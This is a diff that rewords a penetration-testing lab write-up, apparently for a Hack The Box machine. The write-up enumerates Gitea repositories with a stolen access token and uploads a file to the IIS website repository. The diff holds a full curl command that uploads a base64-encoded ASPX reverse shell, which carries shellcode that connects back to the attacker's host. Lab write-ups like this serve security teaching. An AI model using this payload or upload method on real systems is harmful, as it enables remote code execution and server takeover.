@@ -309,9 +309,9 @@ Repositories:
 
 <br />
 
-There is another repo named "website".
+There is another repository named "website".
 
-We can continue enumerating using curl with the access token inside an `Authorization` HTTP header.
+We can continue enumerating using curl by including the access token in the `Authorization` HTTP header.
 
 <br />
 
@@ -497,7 +497,7 @@ We can continue enumerating using curl with the access token inside an `Authoriz
 
 <br />
 
-We should list the available API functionalities by navigating to the `/api/swagger` default Gitea endpoint:
+We can review the available API endpoints by navigating to Gitea's default `/api/swagger` endpoint:
 
 <br />
 
@@ -505,7 +505,7 @@ We should list the available API functionalities by navigating to the `/api/swag
 
 <br />
 
-Among other, there is a really interesting functionality to list the content of a repository:
+Among others, there is a particularly interesting endpoint to list the content of a repository:
 
 <br />
 
@@ -513,7 +513,7 @@ Among other, there is a really interesting functionality to list the content of 
 
 <br />
 
-Based on this function, we proceed to list the content of the `website` repo:
+Using this endpoint, we can list the contents of the `website` repository:
 
 <br />
 
@@ -527,7 +527,7 @@ readme.md
 
 <br />
 
-If we list the content of the `index.html` file we confirm that it is the index of the website running on port 80.
+By retrieving the contents of `index.html`, we confirm that it matches the website served on port 80.
 
 <br />
 
@@ -884,13 +884,13 @@ If we list the content of the `index.html` file we confirm that it is the index 
 
 <br />
 
-## Reverse Shell Upload
+## Initial Foothold - ASPX Reverse Shell
 
 <br />
 
-At this point, something that we could try is to upload a malicious file such a ASPX reverse shell to the IIS website taking advantage from the Gitea access token.
+At this point, something that we could try is to upload a malicious file such as an ASPX reverse shell to the IIS website by leveraging the Gitea access token.
 
-To exploit this we will use the following API function to create a file in the repo `website`:
+To do this we use the following API function to create a file in the repo `website`:
 
 <br />
 
@@ -914,7 +914,7 @@ Saved as: reverse.aspx
 
 <br />
 
-Then, we copy the reverse shell content base64-encoded:
+Then, we base64-encode the reverse shell content and save it into a file:
 
 <br />
 
@@ -924,16 +924,16 @@ Then, we copy the reverse shell content base64-encoded:
 
 <br />
 
-Finally, we paste it in the content file of our request:
+Finally, we include it in the request body as the file content:
 
 <br />
 
 ```bash
-❯ curl -s -X POST -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" -H "Content-Type: application/json" http://10.129.29.102:3000/api/v1/repos/ellen.freeman/website/contents/reverse-shell.aspx -d '{"branch":"main","content":"PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBBdXRvRXZlbnRXaXJldXA9InRydWUiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+CjxzY3JpcHQgcnVuYXQ9InNlcnZlciI+CiAgICBwcml2YXRlIHN0YXRpYyBJbnQzMiBNRU1fQ09NTUlUPTB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFPShJbnRQdHIpMHg0MDsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciBscFN0YXJ0QWRkcixVSW50UHRyIHNpemUsSW50MzIgZmxBbGxvY2F0aW9uVHlwZSxJbnRQdHIgZmxQcm90ZWN0KTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsVUludFB0ciBkd1N0YWNrU2l6ZSxJbnRQdHIgbHBTdGFydEFkZHJlc3MsSW50UHRyIHBhcmFtLEludDMyIGR3Q3JlYXRpb25GbGFncyxyZWYgSW50UHRyIGxwVGhyZWFkSWQpOwoKICAgIHByb3RlY3RlZCB2b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBieXRlW10gaEExZU5aeDg4RyA9IG5ldyBieXRlWzQ2MF0gezB4ZmMsMHg0OCwweDgzLDB4ZTQsMHhmMCwweGU4LDB4YzAsMHgwMCwweDAwLDB4MDAsMHg0MSwweDUxLDB4NDEsCjB4NTAsMHg1MiwweDUxLDB4NTYsMHg0OCwweDMxLDB4ZDIsMHg2NSwweDQ4LDB4OGIsMHg1MiwweDYwLDB4NDgsMHg4YiwweDUyLDB4MTgsMHg0OCwweDhiLDB4NTIsMHgyMCwKMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsMHhhYywweDNjLDB4NjEsMHg3YywweDAyLAoweDJjLDB4MjAsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweGUyLDB4ZWQsMHg1MiwweDQxLDB4NTEsMHg0OCwweDhiLDB4NTIsMHgyMCwweDhiLDB4NDIsCjB4M2MsMHg0OCwweDAxLDB4ZDAsMHg4YiwweDgwLDB4ODgsMHgwMCwweDAwLDB4MDAsMHg0OCwweDg1LDB4YzAsMHg3NCwweDY3LDB4NDgsMHgwMSwweGQwLDB4NTAsMHg4YiwKMHg0OCwweDE4LDB4NDQsMHg4YiwweDQwLDB4MjAsMHg0OSwweDAxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwweDAxLAoweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLDB4YWMsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweDM4LDB4ZTAsMHg3NSwweGYxLDB4NGMsCjB4MDMsMHg0YywweDI0LDB4MDgsMHg0NSwweDM5LDB4ZDEsMHg3NSwweGQ4LDB4NTgsMHg0NCwweDhiLDB4NDAsMHgyNCwweDQ5LDB4MDEsMHhkMCwweDY2LDB4NDEsMHg4YiwKMHgwYywweDQ4LDB4NDQsMHg4YiwweDQwLDB4MWMsMHg0OSwweDAxLDB4ZDAsMHg0MSwweDhiLDB4MDQsMHg4OCwweDQ4LDB4MDEsMHhkMCwweDQxLDB4NTgsMHg0MSwweDU4LAoweDVlLDB4NTksMHg1YSwweDQxLDB4NTgsMHg0MSwweDU5LDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsMHg1OCwweDQxLDB4NTksCjB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OSwweGJlLDB4NzcsMHg3MywweDMyLDB4NWYsMHgzMywweDMyLDB4MDAsMHgwMCwKMHg0MSwweDU2LDB4NDksMHg4OSwweGU2LDB4NDgsMHg4MSwweGVjLDB4YTAsMHgwMSwweDAwLDB4MDAsMHg0OSwweDg5LDB4ZTUsMHg0OSwweGJjLDB4MDIsMHgwMCwweDExLAoweDVjLDB4MGEsMHgwYSwweDBlLDB4ZmQsMHg0MSwweDU0LDB4NDksMHg4OSwweGU0LDB4NGMsMHg4OSwweGYxLDB4NDEsMHhiYSwweDRjLDB4NzcsMHgyNiwweDA3LDB4ZmYsCjB4ZDUsMHg0YywweDg5LDB4ZWEsMHg2OCwweDAxLDB4MDEsMHgwMCwweDAwLDB4NTksMHg0MSwweGJhLDB4MjksMHg4MCwweDZiLDB4MDAsMHhmZiwweGQ1LDB4NTAsMHg1MCwKMHg0ZCwweDMxLDB4YzksMHg0ZCwweDMxLDB4YzAsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzIsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzEsMHg0MSwweGJhLAoweGVhLDB4MGYsMHhkZiwweGUwLDB4ZmYsMHhkNSwweDQ4LDB4ODksMHhjNywweDZhLDB4MTAsMHg0MSwweDU4LDB4NGMsMHg4OSwweGUyLDB4NDgsMHg4OSwweGY5LDB4NDEsCjB4YmEsMHg5OSwweGE1LDB4NzQsMHg2MSwweGZmLDB4ZDUsMHg0OCwweDgxLDB4YzQsMHg0MCwweDAyLDB4MDAsMHgwMCwweDQ5LDB4YjgsMHg2MywweDZkLDB4NjQsMHgwMCwKMHgwMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTAsMHg0MSwweDUwLDB4NDgsMHg4OSwweGUyLDB4NTcsMHg1NywweDU3LDB4NGQsMHgzMSwweGMwLDB4NmEsMHgwZCwweDU5LAoweDQxLDB4NTAsMHhlMiwweGZjLDB4NjYsMHhjNywweDQ0LDB4MjQsMHg1NCwweDAxLDB4MDEsMHg0OCwweDhkLDB4NDQsMHgyNCwweDE4LDB4YzYsMHgwMCwweDY4LDB4NDgsCjB4ODksMHhlNiwweDU2LDB4NTAsMHg0MSwweDUwLDB4NDEsMHg1MCwweDQxLDB4NTAsMHg0OSwweGZmLDB4YzAsMHg0MSwweDUwLDB4NDksMHhmZiwweGM4LDB4NGQsMHg4OSwKMHhjMSwweDRjLDB4ODksMHhjMSwweDQxLDB4YmEsMHg3OSwweGNjLDB4M2YsMHg4NiwweGZmLDB4ZDUsMHg0OCwweDMxLDB4ZDIsMHg0OCwweGZmLDB4Y2EsMHg4YiwweDBlLAoweDQxLDB4YmEsMHgwOCwweDg3LDB4MWQsMHg2MCwweGZmLDB4ZDUsMHhiYiwweGYwLDB4YjUsMHhhMiwweDU2LDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsCjB4ZDUsMHg0OCwweDgzLDB4YzQsMHgyOCwweDNjLDB4MDYsMHg3YywweDBhLDB4ODAsMHhmYiwweGUwLDB4NzUsMHgwNSwweGJiLDB4NDcsMHgxMywweDcyLDB4NmYsMHg2YSwKMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNX07CgogICAgICAgIEludFB0ciBsS0tHUzEgPSBWaXJ0dWFsQWxsb2MoSW50UHRyLlplcm8sKFVJbnRQdHIpaEExZU5aeDg4Ry5MZW5ndGgsTUVNX0NPTU1JVCwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7CiAgICAgICAgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWwuQ29weShoQTFlTlp4ODhHLDAsbEtLR1MxLGhBMWVOWng4OEcuTGVuZ3RoKTsKICAgICAgICBJbnRQdHIgdUo2ZTZZY0daOSA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciByX0ZwaGxWd1EwID0gQ3JlYXRlVGhyZWFkKEludFB0ci5aZXJvLFVJbnRQdHIuWmVybyxsS0tHUzEsSW50UHRyLlplcm8sMCxyZWYgdUo2ZTZZY0daOSk7CiAgICB9Cjwvc2NyaXB0Pgo=","message":"string"}' | jq
+❯ curl -s -X POST -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" -H "Content-Type: application/json" http://10.129.29.102:3000/api/v1/repos/ellen.freeman/website/contents/reverse.aspx -d '{"branch":"main","content":"PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBBdXRvRXZlbnRXaXJldXA9InRydWUiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+CjxzY3JpcHQgcnVuYXQ9InNlcnZlciI+CiAgICBwcml2YXRlIHN0YXRpYyBJbnQzMiBNRU1fQ09NTUlUPTB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFPShJbnRQdHIpMHg0MDsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciBscFN0YXJ0QWRkcixVSW50UHRyIHNpemUsSW50MzIgZmxBbGxvY2F0aW9uVHlwZSxJbnRQdHIgZmxQcm90ZWN0KTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsVUludFB0ciBkd1N0YWNrU2l6ZSxJbnRQdHIgbHBTdGFydEFkZHJlc3MsSW50UHRyIHBhcmFtLEludDMyIGR3Q3JlYXRpb25GbGFncyxyZWYgSW50UHRyIGxwVGhyZWFkSWQpOwoKICAgIHByb3RlY3RlZCB2b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBieXRlW10gaEExZU5aeDg4RyA9IG5ldyBieXRlWzQ2MF0gezB4ZmMsMHg0OCwweDgzLDB4ZTQsMHhmMCwweGU4LDB4YzAsMHgwMCwweDAwLDB4MDAsMHg0MSwweDUxLDB4NDEsCjB4NTAsMHg1MiwweDUxLDB4NTYsMHg0OCwweDMxLDB4ZDIsMHg2NSwweDQ4LDB4OGIsMHg1MiwweDYwLDB4NDgsMHg4YiwweDUyLDB4MTgsMHg0OCwweDhiLDB4NTIsMHgyMCwKMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsMHhhYywweDNjLDB4NjEsMHg3YywweDAyLAoweDJjLDB4MjAsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweGUyLDB4ZWQsMHg1MiwweDQxLDB4NTEsMHg0OCwweDhiLDB4NTIsMHgyMCwweDhiLDB4NDIsCjB4M2MsMHg0OCwweDAxLDB4ZDAsMHg4YiwweDgwLDB4ODgsMHgwMCwweDAwLDB4MDAsMHg0OCwweDg1LDB4YzAsMHg3NCwweDY3LDB4NDgsMHgwMSwweGQwLDB4NTAsMHg4YiwKMHg0OCwweDE4LDB4NDQsMHg4YiwweDQwLDB4MjAsMHg0OSwweDAxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwweDAxLAoweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLDB4YWMsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweDM4LDB4ZTAsMHg3NSwweGYxLDB4NGMsCjB4MDMsMHg0YywweDI0LDB4MDgsMHg0NSwweDM5LDB4ZDEsMHg3NSwweGQ4LDB4NTgsMHg0NCwweDhiLDB4NDAsMHgyNCwweDQ5LDB4MDEsMHhkMCwweDY2LDB4NDEsMHg4YiwKMHgwYywweDQ4LDB4NDQsMHg4YiwweDQwLDB4MWMsMHg0OSwweDAxLDB4ZDAsMHg0MSwweDhiLDB4MDQsMHg4OCwweDQ4LDB4MDEsMHhkMCwweDQxLDB4NTgsMHg0MSwweDU4LAoweDVlLDB4NTksMHg1YSwweDQxLDB4NTgsMHg0MSwweDU5LDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsMHg1OCwweDQxLDB4NTksCjB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OSwweGJlLDB4NzcsMHg3MywweDMyLDB4NWYsMHgzMywweDMyLDB4MDAsMHgwMCwKMHg0MSwweDU2LDB4NDksMHg4OSwweGU2LDB4NDgsMHg4MSwweGVjLDB4YTAsMHgwMSwweDAwLDB4MDAsMHg0OSwweDg5LDB4ZTUsMHg0OSwweGJjLDB4MDIsMHgwMCwweDExLAoweDVjLDB4MGEsMHgwYSwweDBlLDB4ZmQsMHg0MSwweDU0LDB4NDksMHg4OSwweGU0LDB4NGMsMHg4OSwweGYxLDB4NDEsMHhiYSwweDRjLDB4NzcsMHgyNiwweDA3LDB4ZmYsCjB4ZDUsMHg0YywweDg5LDB4ZWEsMHg2OCwweDAxLDB4MDEsMHgwMCwweDAwLDB4NTksMHg0MSwweGJhLDB4MjksMHg4MCwweDZiLDB4MDAsMHhmZiwweGQ1LDB4NTAsMHg1MCwKMHg0ZCwweDMxLDB4YzksMHg0ZCwweDMxLDB4YzAsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzIsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzEsMHg0MSwweGJhLAoweGVhLDB4MGYsMHhkZiwweGUwLDB4ZmYsMHhkNSwweDQ4LDB4ODksMHhjNywweDZhLDB4MTAsMHg0MSwweDU4LDB4NGMsMHg4OSwweGUyLDB4NDgsMHg4OSwweGY5LDB4NDEsCjB4YmEsMHg5OSwweGE1LDB4NzQsMHg2MSwweGZmLDB4ZDUsMHg0OCwweDgxLDB4YzQsMHg0MCwweDAyLDB4MDAsMHgwMCwweDQ5LDB4YjgsMHg2MywweDZkLDB4NjQsMHgwMCwKMHgwMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTAsMHg0MSwweDUwLDB4NDgsMHg4OSwweGUyLDB4NTcsMHg1NywweDU3LDB4NGQsMHgzMSwweGMwLDB4NmEsMHgwZCwweDU5LAoweDQxLDB4NTAsMHhlMiwweGZjLDB4NjYsMHhjNywweDQ0LDB4MjQsMHg1NCwweDAxLDB4MDEsMHg0OCwweDhkLDB4NDQsMHgyNCwweDE4LDB4YzYsMHgwMCwweDY4LDB4NDgsCjB4ODksMHhlNiwweDU2LDB4NTAsMHg0MSwweDUwLDB4NDEsMHg1MCwweDQxLDB4NTAsMHg0OSwweGZmLDB4YzAsMHg0MSwweDUwLDB4NDksMHhmZiwweGM4LDB4NGQsMHg4OSwKMHhjMSwweDRjLDB4ODksMHhjMSwweDQxLDB4YmEsMHg3OSwweGNjLDB4M2YsMHg4NiwweGZmLDB4ZDUsMHg0OCwweDMxLDB4ZDIsMHg0OCwweGZmLDB4Y2EsMHg4YiwweDBlLAoweDQxLDB4YmEsMHgwOCwweDg3LDB4MWQsMHg2MCwweGZmLDB4ZDUsMHhiYiwweGYwLDB4YjUsMHhhMiwweDU2LDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsCjB4ZDUsMHg0OCwweDgzLDB4YzQsMHgyOCwweDNjLDB4MDYsMHg3YywweDBhLDB4ODAsMHhmYiwweGUwLDB4NzUsMHgwNSwweGJiLDB4NDcsMHgxMywweDcyLDB4NmYsMHg2YSwKMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNX07CgogICAgICAgIEludFB0ciBsS0tHUzEgPSBWaXJ0dWFsQWxsb2MoSW50UHRyLlplcm8sKFVJbnRQdHIpaEExZU5aeDg4Ry5MZW5ndGgsTUVNX0NPTU1JVCwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7CiAgICAgICAgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWwuQ29weShoQTFlTlp4ODhHLDAsbEtLR1MxLGhBMWVOWng4OEcuTGVuZ3RoKTsKICAgICAgICBJbnRQdHIgdUo2ZTZZY0daOSA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciByX0ZwaGxWd1EwID0gQ3JlYXRlVGhyZWFkKEludFB0ci5aZXJvLFVJbnRQdHIuWmVybyxsS0tHUzEsSW50UHRyLlplcm8sMCxyZWYgdUo2ZTZZY0daOSk7CiAgICB9Cjwvc2NyaXB0Pgo=","message":"string"}' | jq
 {
   "content": {
-    "name": "reverse-shell.aspx",
-    "path": "reverse-shell.aspx",
+    "name": "reverse.aspx",
+    "path": "reverse.aspx",
     "sha": "8ff8b12f86e41375bcf0cc5424f20452a1b1a1f8",
     "last_commit_sha": "37c3b279fe89d548782737eee9fb6f21deb48ce4",
     "type": "file",
@@ -941,15 +941,15 @@ Finally, we paste it in the content file of our request:
     "encoding": "base64",
     "content": "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBBdXRvRXZlbnRXaXJldXA9InRydWUiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+CjxzY3JpcHQgcnVuYXQ9InNlcnZlciI+CiAgICBwcml2YXRlIHN0YXRpYyBJbnQzMiBNRU1fQ09NTUlUPTB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFPShJbnRQdHIpMHg0MDsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciBscFN0YXJ0QWRkcixVSW50UHRyIHNpemUsSW50MzIgZmxBbGxvY2F0aW9uVHlwZSxJbnRQdHIgZmxQcm90ZWN0KTsKCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsVUludFB0ciBkd1N0YWNrU2l6ZSxJbnRQdHIgbHBTdGFydEFkZHJlc3MsSW50UHRyIHBhcmFtLEludDMyIGR3Q3JlYXRpb25GbGFncyxyZWYgSW50UHRyIGxwVGhyZWFkSWQpOwoKICAgIHByb3RlY3RlZCB2b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBieXRlW10gaEExZU5aeDg4RyA9IG5ldyBieXRlWzQ2MF0gezB4ZmMsMHg0OCwweDgzLDB4ZTQsMHhmMCwweGU4LDB4YzAsMHgwMCwweDAwLDB4MDAsMHg0MSwweDUxLDB4NDEsCjB4NTAsMHg1MiwweDUxLDB4NTYsMHg0OCwweDMxLDB4ZDIsMHg2NSwweDQ4LDB4OGIsMHg1MiwweDYwLDB4NDgsMHg4YiwweDUyLDB4MTgsMHg0OCwweDhiLDB4NTIsMHgyMCwKMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsMHhhYywweDNjLDB4NjEsMHg3YywweDAyLAoweDJjLDB4MjAsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweGUyLDB4ZWQsMHg1MiwweDQxLDB4NTEsMHg0OCwweDhiLDB4NTIsMHgyMCwweDhiLDB4NDIsCjB4M2MsMHg0OCwweDAxLDB4ZDAsMHg4YiwweDgwLDB4ODgsMHgwMCwweDAwLDB4MDAsMHg0OCwweDg1LDB4YzAsMHg3NCwweDY3LDB4NDgsMHgwMSwweGQwLDB4NTAsMHg4YiwKMHg0OCwweDE4LDB4NDQsMHg4YiwweDQwLDB4MjAsMHg0OSwweDAxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwweDAxLAoweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLDB4YWMsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweDM4LDB4ZTAsMHg3NSwweGYxLDB4NGMsCjB4MDMsMHg0YywweDI0LDB4MDgsMHg0NSwweDM5LDB4ZDEsMHg3NSwweGQ4LDB4NTgsMHg0NCwweDhiLDB4NDAsMHgyNCwweDQ5LDB4MDEsMHhkMCwweDY2LDB4NDEsMHg4YiwKMHgwYywweDQ4LDB4NDQsMHg4YiwweDQwLDB4MWMsMHg0OSwweDAxLDB4ZDAsMHg0MSwweDhiLDB4MDQsMHg4OCwweDQ4LDB4MDEsMHhkMCwweDQxLDB4NTgsMHg0MSwweDU4LAoweDVlLDB4NTksMHg1YSwweDQxLDB4NTgsMHg0MSwweDU5LDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsMHg1OCwweDQxLDB4NTksCjB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OSwweGJlLDB4NzcsMHg3MywweDMyLDB4NWYsMHgzMywweDMyLDB4MDAsMHgwMCwKMHg0MSwweDU2LDB4NDksMHg4OSwweGU2LDB4NDgsMHg4MSwweGVjLDB4YTAsMHgwMSwweDAwLDB4MDAsMHg0OSwweDg5LDB4ZTUsMHg0OSwweGJjLDB4MDIsMHgwMCwweDExLAoweDVjLDB4MGEsMHgwYSwweDBlLDB4ZmQsMHg0MSwweDU0LDB4NDksMHg4OSwweGU0LDB4NGMsMHg4OSwweGYxLDB4NDEsMHhiYSwweDRjLDB4NzcsMHgyNiwweDA3LDB4ZmYsCjB4ZDUsMHg0YywweDg5LDB4ZWEsMHg2OCwweDAxLDB4MDEsMHgwMCwweDAwLDB4NTksMHg0MSwweGJhLDB4MjksMHg4MCwweDZiLDB4MDAsMHhmZiwweGQ1LDB4NTAsMHg1MCwKMHg0ZCwweDMxLDB4YzksMHg0ZCwweDMxLDB4YzAsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzIsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzEsMHg0MSwweGJhLAoweGVhLDB4MGYsMHhkZiwweGUwLDB4ZmYsMHhkNSwweDQ4LDB4ODksMHhjNywweDZhLDB4MTAsMHg0MSwweDU4LDB4NGMsMHg4OSwweGUyLDB4NDgsMHg4OSwweGY5LDB4NDEsCjB4YmEsMHg5OSwweGE1LDB4NzQsMHg2MSwweGZmLDB4ZDUsMHg0OCwweDgxLDB4YzQsMHg0MCwweDAyLDB4MDAsMHgwMCwweDQ5LDB4YjgsMHg2MywweDZkLDB4NjQsMHgwMCwKMHgwMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTAsMHg0MSwweDUwLDB4NDgsMHg4OSwweGUyLDB4NTcsMHg1NywweDU3LDB4NGQsMHgzMSwweGMwLDB4NmEsMHgwZCwweDU5LAoweDQxLDB4NTAsMHhlMiwweGZjLDB4NjYsMHhjNywweDQ0LDB4MjQsMHg1NCwweDAxLDB4MDEsMHg0OCwweDhkLDB4NDQsMHgyNCwweDE4LDB4YzYsMHgwMCwweDY4LDB4NDgsCjB4ODksMHhlNiwweDU2LDB4NTAsMHg0MSwweDUwLDB4NDEsMHg1MCwweDQxLDB4NTAsMHg0OSwweGZmLDB4YzAsMHg0MSwweDUwLDB4NDksMHhmZiwweGM4LDB4NGQsMHg4OSwKMHhjMSwweDRjLDB4ODksMHhjMSwweDQxLDB4YmEsMHg3OSwweGNjLDB4M2YsMHg4NiwweGZmLDB4ZDUsMHg0OCwweDMxLDB4ZDIsMHg0OCwweGZmLDB4Y2EsMHg4YiwweDBlLAoweDQxLDB4YmEsMHgwOCwweDg3LDB4MWQsMHg2MCwweGZmLDB4ZDUsMHhiYiwweGYwLDB4YjUsMHhhMiwweDU2LDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsCjB4ZDUsMHg0OCwweDgzLDB4YzQsMHgyOCwweDNjLDB4MDYsMHg3YywweDBhLDB4ODAsMHhmYiwweGUwLDB4NzUsMHgwNSwweGJiLDB4NDcsMHgxMywweDcyLDB4NmYsMHg2YSwKMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNX07CgogICAgICAgIEludFB0ciBsS0tHUzEgPSBWaXJ0dWFsQWxsb2MoSW50UHRyLlplcm8sKFVJbnRQdHIpaEExZU5aeDg4Ry5MZW5ndGgsTUVNX0NPTU1JVCwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7CiAgICAgICAgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWwuQ29weShoQTFlTlp4ODhHLDAsbEtLR1MxLGhBMWVOWng4OEcuTGVuZ3RoKTsKICAgICAgICBJbnRQdHIgdUo2ZTZZY0daOSA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciByX0ZwaGxWd1EwID0gQ3JlYXRlVGhyZWFkKEludFB0ci5aZXJvLFVJbnRQdHIuWmVybyxsS0tHUzEsSW50UHRyLlplcm8sMCxyZWYgdUo2ZTZZY0daOSk7CiAgICB9Cjwvc2NyaXB0Pgo=",
     "target": null,
-    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/reverse-shell.aspx?ref=main",
-    "html_url": "http://localhost:3000/ellen.freeman/website/src/branch/main/reverse-shell.aspx",
+    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/reverse.aspx?ref=main",
+    "html_url": "http://localhost:3000/ellen.freeman/website/src/branch/main/reverse.aspx",
     "git_url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/git/blobs/8ff8b12f86e41375bcf0cc5424f20452a1b1a1f8",
-    "download_url": "http://localhost:3000/ellen.freeman/website/raw/branch/main/reverse-shell.aspx",
+    "download_url": "http://localhost:3000/ellen.freeman/website/raw/branch/main/reverse.aspx",
     "submodule_git_url": null,
     "_links": {
-      "self": "http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/reverse-shell.aspx?ref=main",
